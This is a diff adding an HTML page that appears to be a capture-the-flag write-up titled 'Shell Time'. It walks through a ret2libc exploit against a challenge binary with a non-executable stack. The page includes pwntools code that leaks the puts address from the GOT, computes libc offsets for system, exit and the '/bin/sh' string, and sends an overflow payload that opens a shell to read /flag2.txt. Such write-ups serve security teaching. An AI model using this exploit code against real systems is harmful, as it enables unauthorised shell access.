@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Shell Time</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+    <head>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+    </head>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Shell Time</h1>
+</header>
+<p>The <em>Easy</em> level challenge of this program allows us to call <code>win</code> function to get the first flag. At this level requires us to get the second flag <code>/flag2.txt</code> via shell. The stack is non executable, we can’t just throw some shellcode to it, we need to try <code>ret2libc</code> method. To call<code>system("bin/sh")</code>, we need address of <code>system</code>, address of the <code>binsh</code> string and a return address for <code>system</code>. To find out the actuall address of some function in libc we can use a relative address of the function we want to another function we can easily find out the address. In this case, we call <code>puts@plt</code> to print the actual address of it at runtime which is stored in table <code>got</code>. We need to return send another payload to call <code>system</code>, so we need to return to a function that allow us to go through the whole process again, the payload would be <code>address of puts@plt + address of main + address of put@got</code>.</p>
+<pre><code>puts_plt = elf.plt[&#39;puts&#39;]
+puts_got = elf.got[&#39;puts&#39;]
+payload = b&#39;\x90&#39;*60
+payload += pwn.p32(puts_plt)
+payload += pwn.p32(elf.sym[&quot;main&quot;])
+payload += pwn.p32(puts_got)
+
+pr.sendlineafter(&quot;Input some text: &quot;, payload)
+pr.readuntil(&#39;Return address: &#39;)
+pr.readline()
+pr.readline()
+puts_addr = int.from_bytes(pr.read(4).strip().ljust(4, b&#39;\x00&#39;), &#39;little&#39;)
+print(&#39;puts&#39;, hex(puts_addr))</code></pre>
+<p>When we have the address of <code>puts</code>, we can find the relative address of system and binsh string via <a href="https://libc.blukat.me/?q=puts%3A0xf7d98b40&amp;l=libc6_2.27-3ubuntu1_i386">libc.blukat.me</a>, as we what it exit when <code>system</code> call returns, we also need to find out address of <code>exit</code>.</p>
+<pre><code>sys_addr = puts_addr - 0x2a940
+binsh_addr = puts_addr + 0x11658f
+exit_addr = puts_addr - 227184
+print(&#39;sys&#39;, hex(sys_addr))
+print(&#39;binsh&#39;, hex(binsh_addr))
+payload = b&#39;\x90&#39;*60
+payload += pwn.p32(sys_addr)
+payload += pwn.p32(exit_addr)
+payload += pwn.p32(binsh_addr)
+
+pr.sendlineafter(&quot;Input some text: &quot;, payload)
+pr.sendline(&quot;cat /flag2.txt&quot;)
+print(pr.readall(2).decode())</code></pre>
+<p>When we get a shell, <code>cat</code> command brings us the flag.</p>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
